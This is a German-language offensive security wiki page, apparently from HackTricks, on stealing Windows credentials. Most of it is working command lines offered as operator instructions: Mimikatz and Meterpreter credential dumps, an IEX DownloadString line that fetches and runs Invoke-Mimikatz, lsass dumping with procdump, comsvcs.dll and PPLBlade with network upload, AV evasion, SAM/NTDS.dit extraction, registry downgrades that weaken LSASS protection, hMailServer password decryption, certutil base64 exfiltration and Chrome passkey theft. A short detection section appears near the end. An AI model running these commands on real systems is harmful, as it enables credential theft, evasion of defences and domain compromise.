# Windows-Anmeldedaten stehlen

{{#include ../../banners/hacktricks-training.md}}

## Mimikatz-Anmeldedaten
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Finde auf** [**dieser Seite**](credentials-mimikatz.md) **weitere Dinge, die Mimikatz tun kann.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Erfahre hier mehr über einige mögliche Maßnahmen zum Schutz von Anmeldedaten.**](credentials-protections.md) **Diese Schutzmaßnahmen könnten Mimikatz daran hindern, einige Anmeldedaten zu extrahieren.**

## Anmeldedaten mit Meterpreter

Verwende das von mir erstellte [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials), um **Passwörter und Hashes** innerhalb des Opfers zu **suchen**.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Umgehen von AV

### Procdump + Mimikatz

Da **Procdump von** [**SysInternals**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) **ein legitimes Microsoft-Tool ist**, wird es von Defender nicht erkannt.\
Mit diesem Tool kannst du den **lsass-Prozess dumpen**, den **Dump herunterladen** und die **Credentials lokal** aus dem Dump **extrahieren**.

Du könntest auch [SharpDump](https://github.com/GhostPack/SharpDump) verwenden.
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Dieser Prozess wird automatisch mit [SprayKatz](https://github.com/aas-n/spraykatz) durchgeführt: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Hinweis**: Einige **AV** können die Verwendung von **procdump.exe zum Dumpen von lsass.exe** als **malicious** **erkennen**, da sie die Zeichenfolgen **"procdump.exe" und "lsass.exe"** **erkennen**. Daher ist es **stealthier**, die **PID** von lsass.exe als **Argument** an procdump zu übergeben, anstatt den **Namen lsass.exe** zu verwenden.

### Dumping von lsass mit **comsvcs.dll**

Eine DLL namens **comsvcs.dll**, die sich in `C:\Windows\System32` befindet, ist für das **Dumpen des Prozessspeichers** im Falle eines Absturzes verantwortlich. Diese DLL enthält eine **Funktion** namens **`MiniDumpW`**, die mithilfe von `rundll32.exe` aufgerufen werden kann.\
Die ersten beiden Argumente sind irrelevant, das dritte ist jedoch in drei Komponenten unterteilt. Die Prozess-ID, die gedumpt werden soll, bildet die erste Komponente, der Speicherort der Dump-Datei stellt die zweite dar, und die dritte Komponente ist ausschließlich das Wort **full**. Es gibt keine alternativen Optionen.\
Nach dem Parsen dieser drei Komponenten wird die DLL damit beauftragt, die Dump-Datei zu erstellen und den Speicher des angegebenen Prozesses in diese Datei zu übertragen.\
Die Verwendung von **comsvcs.dll** zum Dumpen des lsass-Prozesses ist möglich, wodurch das Hochladen und Ausführen von procdump überflüssig wird. Diese Methode wird ausführlich unter [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) beschrieben.

Der folgende Befehl wird zur Ausführung verwendet:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**You can automate this process with** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping von lsass mit Task Manager**

1. Klicke mit der rechten Maustaste auf die Taskleiste und klicke auf Task Manager
2. Klicke auf More details
3. Suche im Tab Processes nach dem Prozess "Local Security Authority Process"
4. Klicke mit der rechten Maustaste auf den Prozess "Local Security Authority Process" und klicke auf "Create dump file".

### Dumping von lsass mit procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) ist ein von Microsoft signiertes Binary, das Teil der [sysinternals](https://docs.microsoft.com/en-us/sysinternals/)-Suite ist.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumping von lsass mit PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) ist ein Tool zum Dumpen geschützter Prozesse, das die Speicher-Dumps obfuskieren und auf entfernte Workstations übertragen kann, ohne sie auf der Festplatte abzulegen.

**Wichtige Funktionen**:

1. Umgehen des PPL-Schutzes
2. Obfuskieren von Speicher-Dump-Dateien, um signaturbasierte Erkennungsmechanismen von Defender zu umgehen
3. Hochladen von Speicher-Dumps mit RAW- und SMB-Upload-Methoden, ohne sie auf der Festplatte abzulegen (fileless Dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon liefert einen dreistufigen Dumper namens **LalsDumper**, der niemals `MiniDumpWriteDump` aufruft, sodass EDR-Hooks für diese API nie ausgelöst werden:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – durchsucht `fdp.dll` nach einem Platzhalter aus 32 Kleinbuchstaben `d`, überschreibt ihn mit dem absoluten Pfad zu `rtu.txt`, speichert die gepatchte DLL als `nfdp.dll` und ruft `AddSecurityPackageA("nfdp","fdp")` auf. Dadurch wird **LSASS** gezwungen, die schädliche DLL als neuen Security Support Provider (SSP) zu laden.
2. **Stage 2 innerhalb von LSASS** – wenn LSASS `nfdp.dll` lädt, liest die DLL `rtu.txt`, XORt jedes Byte mit `0x20` und mappt den decodierten Blob in den Speicher, bevor sie die Ausführung übergibt.
3. **Stage 3 dumper** – der gemappte Payload implementiert die MiniDump-Logik mithilfe von **direct syscalls** neu, die aus gehashten API-Namen aufgelöst werden (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Ein spezieller Export namens `Tom` öffnet `%TEMP%\<pid>.ddt`, schreibt einen komprimierten LSASS-Dump in die Datei und schließt das Handle, sodass die Exfiltration später erfolgen kann.

Hinweise für den Operator:

* `lals.exe`, `fdp.dll`, `nfdp.dll` und `rtu.txt` müssen sich im selben Verzeichnis befinden. Stage 1 ersetzt den fest einkompilierten Platzhalter durch den absoluten Pfad zu `rtu.txt`; eine Aufteilung der Dateien unterbricht daher die Kette.
* Die Registrierung erfolgt durch Anhängen von `nfdp` an `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Du kannst diesen Wert selbst vorab setzen, damit LSASS den SSP bei jedem Systemstart erneut lädt.
* `%TEMP%\*.ddt`-Dateien sind komprimierte Dumps. Dekomprimiere sie lokal und übergib sie anschließend an Mimikatz/Volatility zur Extraktion von Credentials.
* Zum Ausführen von `lals.exe` sind Admin-/SeTcb-Rechte erforderlich, damit `AddSecurityPackageA` erfolgreich ist; sobald der Aufruf zurückkehrt, lädt LSASS den Rogue-SSP transparent und führt Stage 2 aus.
* Das Entfernen der DLL vom Datenträger entfernt sie nicht aus LSASS. Lösche entweder den Registry-Eintrag und starte LSASS neu (Neustart) oder lasse ihn für langfristige Persistenz bestehen.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSA-Geheimnisse auslesen
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### NTDS.dit vom Ziel-DC dumpen
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump der NTDS.dit-Passworthistorie vom Ziel-DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Das pwdLastSet-Attribut für jedes NTDS.dit-Konto anzeigen
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stehlen von SAM & SYSTEM

Diese Dateien sollten sich in _C:\windows\system32\config\SAM_ und _C:\windows\system32\config\SYSTEM_ befinden. Sie können sie jedoch **nicht einfach auf reguläre Weise kopieren**, da sie geschützt sind.

### Aus der Registry

Der einfachste Weg, diese Dateien zu stehlen, besteht darin, eine Kopie aus der Registry abzurufen:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Lade** diese Dateien auf deine **Kali-Maschine** herunter und **extrahiere die Hashes** mithilfe von:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Mit diesem Dienst können Sie Kopien geschützter Dateien erstellen. Sie benötigen Administratorrechte.

#### Using vssadmin

Die Binärdatei `vssadmin` ist nur in Windows-Server-Versionen verfügbar.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Aber dasselbe können Sie auch aus **Powershell** heraus tun. Dies ist ein Beispiel dafür, **wie man die SAM-Datei kopiert** (das verwendete Laufwerk ist „C:“ und sie wird unter C:\users\Public gespeichert), aber Sie können dies zum Kopieren jeder geschützten Datei verwenden:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Code aus dem Buch: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Schließlich könntest du auch das [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) verwenden, um eine Kopie von SAM, SYSTEM und ntds.dit zu erstellen.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

Die Datei **NTDS.dit** ist als das Herzstück von **Active Directory** bekannt und enthält wichtige Daten über Benutzerobjekte, Gruppen und deren Mitgliedschaften. In ihr werden die **password hashes** der Domänenbenutzer gespeichert. Diese Datei ist eine **Extensible Storage Engine (ESE)**-Datenbank und befindet sich unter **_%SystemRoom%/NTDS/ntds.dit_**.

In dieser Datenbank werden drei primäre Tabellen verwaltet:

- **Data Table**: Diese Tabelle speichert Details zu Objekten wie Benutzern und Gruppen.
- **Link Table**: Sie erfasst Beziehungen, beispielsweise Gruppenmitgliedschaften.
- **SD Table**: Die **Security descriptors** für jedes Objekt werden hier gespeichert, um die Sicherheit und Zugriffskontrolle für die gespeicherten Objekte zu gewährleisten.

Weitere Informationen dazu: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)<sup>[[8]](#references)</sup>

Windows verwendet _Ntdsa.dll_, um mit dieser Datei zu interagieren, und sie wird von _lsass.exe_ verwendet. Dann könnte sich ein **Teil** der Datei **NTDS.dit** im Speicher von **`lsass`** befinden (du findest wahrscheinlich die zuletzt abgerufenen Daten, da die Performance durch die Verwendung eines **cache** verbessert wird).

#### Entschlüsseln der Hashes in NTDS.dit

Der Hash wird dreimal verschlüsselt:

1. Den Password Encryption Key (**PEK**) mithilfe des **BOOTKEY** und **RC4** entschlüsseln.
2. Den **hash** mithilfe des **PEK** und **RC4** entschlüsseln.
3. Den **hash** mithilfe von **DES** entschlüsseln.

Der **PEK** hat in **jedem Domain Controller** denselben Wert, ist jedoch innerhalb der Datei **NTDS.dit** mithilfe des **BOOTKEY** der **SYSTEM-Datei des Domain Controllers (zwischen Domain Controllern unterschiedlich)** verschlüsselt. Deshalb benötigst du die Dateien NTDS.dit und SYSTEM, um die Credentials aus der Datei NTDS.dit zu erhalten (_C:\Windows\System32\config\SYSTEM_).

### NTDS.dit mit Ntdsutil kopieren

Seit Windows Server 2008 verfügbar.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Du könntest auch den Trick der [**volume shadow copy**](#stealing-sam-and-system) verwenden, um die Datei **ntds.dit** zu kopieren. Denke daran, dass du außerdem eine Kopie der **SYSTEM-Datei** benötigst (erneut den Trick [**aus der Registry zu dumpen oder die volume shadow copy zu verwenden**](#stealing-sam-and-system)).

### **Hashes aus NTDS.dit extrahieren**

Sobald du die Dateien **NTDS.dit** und **SYSTEM** **erhalten** hast, kannst du Tools wie _secretsdump.py_ verwenden, um die **Hashes zu extrahieren**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Du kannst sie auch **automatisch extrahieren**, indem du einen gültigen Domain-Admin-Benutzer verwendest:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Für **große NTDS.dit-Dateien** wird empfohlen, sie mit [gosecretsdump](https://github.com/c-sto/gosecretsdump) zu extrahieren.

Schließlich kannst du auch das **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ oder **mimikatz** `lsadump::lsa /inject` verwenden.

### **Extrahieren von Domänenobjekten aus NTDS.dit in eine SQLite-Datenbank**

NTDS-Objekte können mit [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) in eine SQLite-Datenbank extrahiert werden. Dabei werden nicht nur Secrets extrahiert, sondern auch die vollständigen Objekte und ihre Attribute, um weitere Informationen zu extrahieren, sobald die rohe NTDS.dit-Datei bereits abgerufen wurde.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Der `SYSTEM` hive ist optional, ermöglicht aber die Entschlüsselung von Geheimnissen (NT- und LM-Hashes, ergänzende Anmeldeinformationen wie Klartextpasswörter, Kerberos- oder Trust-Schlüssel sowie NT- und LM-Passwortverläufe). Zusammen mit anderen Informationen werden folgende Daten extrahiert: Benutzer- und Computerkonten mit ihren Hashes, UAC-Flags, Zeitstempel der letzten Anmeldung und Passwortänderung, Kontobeschreibungen, Namen, UPN, SPN, Gruppen und rekursive Mitgliedschaften, die Struktur und Mitgliedschaft von Organisationseinheiten, vertrauenswürdige Domänen mit Trust-Typ, -Richtung und -Attributen ...

## Lazagne

Lade die Binärdatei von [hier](https://github.com/AlessandroZ/LaZagne/releases) herunter. Du kannst diese Binärdatei verwenden, um Anmeldeinformationen aus verschiedenen Softwareprogrammen zu extrahieren.
```
lazagne.exe all
```
## Weitere Tools zum Extrahieren von Zugangsdaten aus SAM und LSASS

### Windows credentials Editor (WCE)

Dieses Tool kann zum Extrahieren von Zugangsdaten aus dem Speicher verwendet werden. Lade es hier herunter: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Zugangsdaten aus der SAM-Datei extrahieren
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Anmeldedaten aus der SAM-Datei extrahieren
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Lade es von [http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) herunter und **führe es einfach aus**; die Passwörter werden extrahiert.

## Inaktive RDP-Sitzungen auswerten und Sicherheitskontrollen schwächen

Ink Dragons FinalDraft RAT enthält einen `DumpRDPHistory`-Tasker, dessen Techniken für jeden Red-Teamer nützlich sind:<sup>[[3]](#references)</sup>

### Telemetriesammlung im Stil von DumpRDPHistory

* **Ausgehende RDP-Ziele** – analysiere jede Benutzerstruktur unter `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Jeder Unterschlüssel speichert den Servernamen, `UsernameHint` und den Zeitstempel der letzten Änderung. Du kannst die Logik von FinalDraft mit PowerShell nachbilden:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Hinweise auf eingehende RDP-Verbindungen** – frage das Protokoll `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` nach den Ereignis-IDs **21** (erfolgreiche Anmeldung) und **25** (Trennung) ab, um zu ermitteln, wer den Rechner administriert hat:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Sobald du weißt, welcher Domain Admin sich regelmäßig verbindet, dump LSASS (mit LalsDumper/Mimikatz), solange seine **getrennte** Sitzung noch existiert. CredSSP + NTLM fallback hinterlassen ihren Verifier und ihre Tokens in LSASS, die anschließend über SMB/WinRM wiederverwendet werden können, um `NTDS.dit` zu stehlen oder Persistence auf Domain Controllern einzurichten.

### Von FinalDraft angegriffene Registry-Downgrades

Dasselbe Implantat manipuliert außerdem mehrere Registrierungsschlüssel, um Credential Theft zu erleichtern:<sup>[[3]](#references)</sup>
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Das Setzen von `DisableRestrictedAdmin=1` erzwingt die vollständige Wiederverwendung von Credentials/Tickets während RDP und ermöglicht pass-the-hash-ähnliche Pivoting-Aktionen.
* `LocalAccountTokenFilterPolicy=1` deaktiviert die UAC-Token-Filterung, sodass lokale Administratoren über das Netzwerk uneingeschränkte Tokens erhalten.
* `DSRMAdminLogonBehavior=2` ermöglicht es dem DSRM-Administrator, sich anzumelden, während der DC online ist, und bietet Angreifern dadurch ein weiteres integriertes Konto mit hohen Privilegien.
* `RunAsPPL=0` entfernt den LSASS-PPL-Schutz, wodurch der Speicherzugriff für Dumpers wie LalsDumper trivial wird.

## hMailServer-Datenbank-Credentials (nach der Kompromittierung)

hMailServer speichert das DB-Passwort in `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` unter `[Database] Password=`. Der Wert ist mit dem statischen Schlüssel `THIS_KEY_IS_NOT_SECRET` per Blowfish verschlüsselt und verwendet 4-Byte-Word-Endianness-Swaps. Verwende den Hex-String aus der INI mit diesem Python-Snippet:<sup>[[2]](#references)</sup>
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Mit dem Klartext-Passwort die SQL-CE-Datenbank kopieren, um Dateisperren zu vermeiden, den 32-Bit-Provider laden und bei Bedarf ein Upgrade durchführen, bevor die Hashes abgefragt werden:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
Die Spalte `accountpassword` verwendet das hMailServer-Hash-Format (hashcat mode `1421`). Das Cracken dieser Werte kann wiederverwendbare Zugangsdaten für WinRM/SSH-Pivots liefern.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Einige Tools erfassen **Klartext-Logon-Passwörter**, indem sie den LSA-Logon-Callback `LsaApLogonUserEx2` abfangen. Die Idee besteht darin, den Callback des Authentication Package zu hooken oder zu wrappen, damit Zugangsdaten **während des Logons** (vor dem Hashing) erfasst und anschließend auf die Festplatte geschrieben oder an den Operator zurückgegeben werden. Dies wird üblicherweise als Helper implementiert, der sich in LSA injiziert oder bei LSA registriert und anschließend jedes erfolgreiche interaktive oder Netzwerk-Logon-Ereignis mit Benutzername, Domain und Passwort protokolliert.<sup>[[1]](#references)</sup>

Betriebshinweise:
- Erfordert lokale Administratorrechte/SYSTEM, um den Helper in den Authentication Path zu laden.
- Erfasste Zugangsdaten erscheinen nur, wenn ein Logon erfolgt (interaktiv, RDP, Service- oder Netzwerk-Logon, abhängig vom Hook).

## Gespeicherte SSMS-Verbindungsdaten (sqlstudio.bin)

SQL Server Management Studio (SSMS) speichert gespeicherte Verbindungsinformationen in einer benutzerspezifischen `sqlstudio.bin`-Datei. Dedizierte Dumper können die Datei parsen und gespeicherte SQL-Zugangsdaten wiederherstellen. In Shells, die nur Command Output zurückgeben, wird die Datei häufig exfiltriert, indem sie als Base64 kodiert und auf stdout ausgegeben wird.<sup>[[1]](#references)</sup>
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
Auf der Operator-Seite die Datei neu erstellen und den Dumper lokal ausführen, um Zugangsdaten wiederherzustellen:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Passkeys / WebAuthn credential theft from Chrome unter Windows

Wenn eine Codeausführung als **victim user** auf einem Windows-Host mit **Chrome + Google Password Manager synced passkeys** erreicht wird, werden Passkeys zu einem interessanten **post-exploitation**-Ziel, selbst **ohne admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Interessante lokale Artefakte
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`** speichert protobuf-kodierte **`WebauthnCredentialSpecifics`**-Datensätze. Ein Prozess desselben Benutzers kann die **RP ID**, den **username**, die **credential ID** und verschlüsseltes Private-Key-Material für synchronisierte Passkeys aufzählen.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** speichert den lokalen Geräteeinschreibungsstatus, etwa **`wrapped_identity_private_key`** und das gewrappte Secret, das zur Wiederherstellung synchronisierter Credentials verwendet wird.<sup>[[4]](#references)</sup>

Schnelle Triage:
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### An TPM gebundene Key-Blobs können weiterhin als lokales Signier-Orakel missbraucht werden

Wenn der Browser einen TPM-gestützten Identitätsschlüssel als **`NCRYPT_OPAQUE_KEY_BLOB`** exportiert und dieses Blob in einem für Benutzer zugänglichen Zustand speichert, muss Malware nicht den privaten Schlüssel im Klartext extrahieren. Sie kann das Blob einfach auf **demselben Computer** erneut importieren und das lokale TPM auffordern, von einem Angreifer kontrollierte Daten zu signieren:<sup>[[4]](#references)[[6]](#references)</sup>
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
Das bedeutet: **Hardware-Bindung verhindert den Export außerhalb des Geräts, aber nicht die Nutzung durch denselben Benutzer auf dem kompromittierten Endpoint**.

### Praktische Missbrauchswege

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
- `WebauthnCredentialSpecifics` aus Chromes LevelDB aufzählen.
- Eine Passkey-Anmeldung starten und eine neue WebAuthn-Challenge erhalten.
- Den gestohlenen Blob `wrapped_identity_private_key` auf dem TPM des Opfers verwenden, um die Bindung der Cloud-Authenticator-Anfrage zu signieren.
- Die zurückgegebene Assertion an die Relying Party weiterleiten.
- Dies ist besonders wertvoll, wenn die RP `userVerification=preferred` akzeptiert oder Assertions mit **`UV=0`** nicht ablehnt.

2. **Hijacking eines ausstehenden UV-Schlüssels**<sup>[[4]](#references)</sup>
- Ein erneutes Onboarding erzwingen, indem `passkey_enclave_state` gelöscht oder eine gültig signierte `device/forget`-Operation gesendet wird.
- Falls das Onboarding das Gerät in **`uv_key_pending`** zurücklässt, einen vom Angreifer kontrollierten öffentlichen UV-Schlüssel registrieren.
- Wenn der Provider die Attestation bzw. die Herkunft der sicheren Hardware für den neuen UV-Schlüssel nicht überprüft, werden spätere Signaturen des Angreiferschlüssels als **`UV=1`** behandelt.

3. **Diebstahl von Master-Secret / SDS-Recovery**<sup>[[4]](#references)</sup>
- Eine Recovery oder einen erneuten Join erzwingen, damit Chrome das Master-Secret für synchronisierte Passkeys abruft.
- Die Neuerstellung oder Änderung von `passkey_enclave_state` überwachen und anschließend einen Dump des Chrome-Speichers erstellen, während das Klartext-**Security-Domain-Secret (SDS)** resident ist.
- Das wiederhergestellte SDS verwenden, um die verschlüsselten Felder in jedem `WebauthnCredentialSpecifics`-Datensatz zu entschlüsseln und portable private WebAuthn-Schlüssel wiederherzustellen.

### DFIR- / Erkennungsideen

- **Löschen/Neuerstellen** von `passkey_enclave_state` überwachen.<sup>[[4]](#references)</sup>
- Auf ungewöhnlichen Zugriff nicht browserbasierter Prozesse auf Chromes **`Sync Data\LevelDB`** alarmieren.
- Auf **Chrome-Speicherabbilder** oder verdächtigen prozessübergreifenden Speicherzugriff alarmieren.
- Wiederholte Eingabeaufforderungen für die **Google Password Manager-Recovery-PIN** oder unerwartetes erneutes Onboarding untersuchen.
- Beachten, dass WebAuthn-**`signCount`** bei synchronisierten Passkeys oft nicht nützlich ist, da der Wert konstant bleiben kann. Dadurch ist die klassische Erkennung von Klonen schwach.

## References

- [1] [Unit 42 – An Investigation Into Years of Undetected Operations Targeting High-Value Sectors](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: A Novel Attack Surface in Passwordless Authentication](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG key storage](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Ataques a Sistemas y Redes Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [How the Active Directory Data Store Really Works: Inside NTDS.dit (Part 1)](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

{{#include ../../banners/hacktricks-training.md}}
